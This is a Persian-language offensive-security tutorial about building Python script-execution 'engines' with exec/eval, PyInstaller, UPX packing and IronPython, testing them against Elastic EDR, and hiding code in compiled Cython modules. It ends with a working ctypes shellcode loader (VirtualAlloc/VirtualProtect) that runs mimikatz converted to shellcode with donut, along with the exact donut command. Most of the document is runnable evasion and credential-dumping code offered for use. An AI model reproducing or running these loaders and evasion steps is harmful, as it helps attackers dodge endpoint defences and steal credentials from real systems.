

خب ما اومدیم  به جای اینکه یکی از روش های نوینی که همیشه میومدن hello world رو چاپ میکنن اومدیم اول در نظر گرفتیم  رو سیستم هدف python نیست و ما برای  اینکه بتونیم کد های python خودمون رو اجرا کنیم رو سیستم هدف بدون وجود خوده engine  پایتون اومدیم یه engine  رو طراحی کردیم به واسطه تابع 

- exec
- eval

این دو تابع مجموعه یی از string ها در قالب دستور پایتون برای ما اجرا میکنن یعنی میتونیم کد های python خودمون رو بهش بدیم تا اجرا کنه 

```python
file  = open("test.txt",encoding='utf-16').read()
exec(file)
```

test.txt
```
print("hello world")
```

مرحله بعدی اینه که بیایم حالا اون engine  که ساختیم رو از طریق pyinstaller بیایم و کامپایل کنیم 

```shell
pyinstaller -F engine.py
```

از این سوییچ استفاده میکنیم به این خاطر که پروژه ما  رو حالت release کامپایل شه و هیچ فایلی برای debug یا dll دیگری نسازه 

![[Pasted image 20260509205201.png]]

متود بعدی همین کارو از طریق تابع eval میایم انجام میدیم

نکته یی که وجود داره اینه که این تابع object python میگیره پس ما باید بیایم اول استرینگمون که میشه همون کد پایتون مون رو با استفاده از تابع compile به object python درش بیاریم و تو مرحله بعدی بیایم اون object رو با تابع eval بدیم تا بخونه، تفسیر کنه و درنهایت اجرا کنه


```python
fp = open("test.txt",encoding='utf-16').read()
eval(compile(fp,'<string>','exec'))
```

تابع compile سه تا ورودی میگیره اولی اون فایلی هست که شامل کد های python ما میشه 
دومی اسم فایلی که قراره توسط این تابع تولید بشه ( اگر میخواین فایلی درست نشه و این فرایند immemory انجام بشه ) ورودی دوم رو string قرار بدین 
ورودی سوم دوتا چیز میتونه باشه 
- exec
- eval 
اگر کد های python شما multiline باشه از تابع exec استفاده کنید اگر inline باشه eval


یکی از ابزار هایی که وجود داره و برای pack کردن هم استفاده میشه ابزار upx هست 

```shell
upx.exe --force --ultra-brute --all-methods engine.exe
```

![[Pasted image 20260509213818.png]]

---

بریم یکی دیگه از روش های ساخت engine  تو python رو باهم چک کنیم در روش قراره بیایم با استفاده از# C اینکارو انجام بد

یکی از کلاس هایی هایی که ماکروسافت در اختیار برنامه نویس ها قرار میده IronPython هست که میتونیم در visual studio با استفاده از NuGet بیایم و اکستینشو دانلود و نصب کنیم 


```c#
using IronPython.Modules;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ironpython
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Microsoft.Scripting.Hosting.ScriptEngine pythonengine = IronPython.Hosting.Python.CreateEngine();
            Microsoft.Scripting.Hosting.ScriptSource pythonscript = pythonengine.CreateScriptSourceFromFile(args[0]);
            pythonscript.Execute();
        }
    }
}
```

زمانی که ما این فایل رو build میگیریم حجم خیلی زیادی dll و فایل xml هم کنارش تولید میشه که ما نیازی به این فایل ها ندارم البته نه همش یه سری هاش 

![[Pasted image 20260509221613.png]]

ما به همه این ها نیازی نداریم 

![[Pasted image 20260509222213.png]]

فقط به dll ها احتیاج داریم 

پس dll ها همراه فایل باینری رو ببرین رو سیستم 


**![[Pasted image 20260509223114.png]]


بریم حالا باهم دیگه عملکرد Elastic EDR رو برسی کنیم ببینیم کدومش رو اجازه میده اجرا کنیم 

# Demo

![[Screen Recording 2026-05-09 223637.mp4]]


من خودم تعجب کردم که روش اول رو نگرفت اما دومی رو گرفت ولی در روش سوم همونطور که میبینید حجم کمتری داره  دیتکشن پایین تری داره 



--- 

بری باهم حالا یه کاره دیگرو انجام بدیم فرض کنید که یه کد با ارزش دارین که نمیخواین به صورت plain text بزارید رو سیستم هدف خب چیکار میتونیم بکنیم 
یکی از کار هایی که میتونیم انجام بدیم اینه که بیایم اون کد پایتون که همون فایل txt هستش رو به ماژول در بیاریم و اون ماژول رو به engine  مون اضافه کنیم 

پس مرحله اول اینه که بریم همون فایل txt که شامل دستورات پایتون ما بود رو برداریم بیاریم رو سیستم خودمون 

![[Pasted image 20260509232608.png]]

این مجموعه یی از دستورات ما بود حالا تو مرحله بعد باید پسوند فایل که txt هست رو به pyx تبدیل کنیم 
python extension 
حالا تو همون مسیر بعد از انجام اینکار میایم و یه فایل setup درست میکنیم 

- setup.py

حالا این از طریق توابع cython و distutils میایم و کد اسکتیشن خودمون رو به یه کد میانی درش میاریم که میشه همون pyd یا module که تو engine از اون ماژول رو ایمپورت کنیم و ازش استفاده کنیم 



```python
from distutils.core import setup
from cython.Build import cythonize

setup(ext_modules=cythonize("test.pyx"))
```

این میاد:

```text
test.pyx
```

رو تبدیل می‌کنه به:

- فایل C
    
- و بعد extension module (`.pyd` در ویندوز)
    

---

ولی چند نکته مهم هست:

# 1 — distutils قدیمی شده

در نسخه‌های جدید Python بهتره از `setuptools` استفاده کنی:

```python
from setuptools import setup
from Cython.Build import cythonize

setup(
    ext_modules=cythonize("test.pyx")
)
```

---

# 2 — برای build کردن

باید این دستور رو بزنی:

```bash
python setup.py build_ext --inplace
```


- --inplace

این ارگومان به این منظور استفاده میشه که اگر برنامه ما تو دل خودش داشت از کتابخونه های دیگری استفاده میکرد کنار خودش drop کنه و در runtime بیاد ازشون inmemoey استفاده کنه 

---

# 3 — خروجی

اگر فایل:

```text
test.pyx
```

داشته باشی، بعد از build چیزی شبیه این می‌گیری:

```text
test.cp312-win_amd64.pyd
```

یا:

```text
test.pyd
```

---

# 4 — مثال کامل

## test.pyx

```python
print("hello from cython")
```

---

## setup.py

```python
from setuptools import setup
from Cython.Build import cythonize

setup(
    ext_modules=cythonize("test.pyx")
)
```

---

## build

```bash
python setup.py build_ext --inplace
```


![[Pasted image 20260509235212.png]]

دقت داشته باشید که فایل حتما باید encoding درستی رو داشته باشه 


![[Pasted image 20260509235336.png]]

![[Pasted image 20260509235441.png]]

---

## اجرا

بعد داخل Python:

```python
import test
```

یه موردی که اینجا باید حتما رعایت بشه اینه که برنامه ما از دایرکتوری فعلی ما نمیاد اون ماژول رو بخونه، ما باید خودمون مسیر رو بهش معرفی کنیم اما چطور میتونیم اینکارو بکنیم  

الان ما یه فایل ماژول داریم که شامل print و گرفتن نسخه ورژن و ...... میشه

![[Pasted image 20260510001143.png]]

دقت کنید محتوای این دستورات در ماژول ما قرار گرفته 


یه engine  داریم که قراره بیاد محتوای یه فایل txt که شامل کد python هست رو بخونه و در نهایت اجرا کنه 
یه فایل txt داریم که این فایل شامل import کردن ماژول ما میشه اما برای اینکه این ماژول به درستی import بشه و توسط engine  ما تحلیل بشه باید کاری که انجام بدیم اینه که اول مسیر رو بگیریم و تو مرحله بعد اون مسیر رو append کنیم 

```
engine.exe
   |
   -> test.txt
          |
          -> import module.pyd
```

test.txt
```python
import os
import sys
p = os.getcwd()
sys.path.append(p)
import test
```

----



# Demo 

charon.pyd

```python
import sys
print(sys.version)
print("hello charon")
```

test.txt

```python
import os
import sys

sys.path.insert(0, os.getcwd())
import charon
```


---


پس تا اینجای کار ما اومدیم همون چند تا کد python رو به module تبدیل کردیم که کد به صورت plain text نشون داده نشود 

یه نکته یی که وجود داره اینه که اگر قراره از library های خاصی استفاه کنیم باید حتما اون library هارو به engine  اضافه کنیم و مجدد build بگیریم
 تا تمامیه کد های اون ماژول به engine  ما اضافه بشه 


---

بریم حالا تو مرحله بعدی mimikatz رو با استفاده از donut به shellcode در بیاریم و رو current process خودمون inject و در نهایت اجرا کنیم 



![[Pasted image 20260510131436.png]]


توی این روش ما میایم با استفاده از ابزار donut پروژه mimikartz رو به shellcode در میاریم 


**mimi.pyx**
```python
import ctypes
import sys
import mimishell


def run_code_windows(shellcode):
    k32 = ctypes.windll.kernel32
    k32.VirtualAlloc.restype = ctypes.c_void_p
    int_p = ctypes.POINTER(ctypes.c_int)
    k32.VirtualProtect.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int,
                                   int_p]
    mem = k32.VirtualAlloc(0, len(shellcode), 0x3000, 4)
    if not mem:
        sys.stderr.write("Alloc: {}\n".format(ctypes.FormatError()))
        return 1

    ctypes.memmove(mem, shellcode, len(shellcode))
    oldprot = ctypes.c_int()
    if not k32.VirtualProtect(mem, len(shellcode), 32, ctypes.byref(oldprot)):
        sys.stderr.write("Protect: {}\n".format(ctypes.FormatError()))
        return 1
    return ctypes.CFUNCTYPE(ctypes.c_int)(mem)()


run_code_windows(mimishell.buff)
```

این فایل میشه ماژول ما که قراره runtime بیاد mimikatz رو بگیره و بخونه اجراش کنه اما mimikatz چطوری بگیریم 

```shell
donut.exe -i mimikatz.exe -a 3 -z 2 -f 5
```

خوده ابزار donut رو هم میتونید از github بگیرید 

## https://github.com/TheWover/donut


Engine.exe
```python
import ctypes
import sys
import base64

fp = open("test.txt",encoding='utf-8').read()
exec(fp)
```


test.txt
```python
import os
import sys

sys.path.insert(0, os.getcwd())
import mimi
```

![[Pasted image 20260510141725.png]]
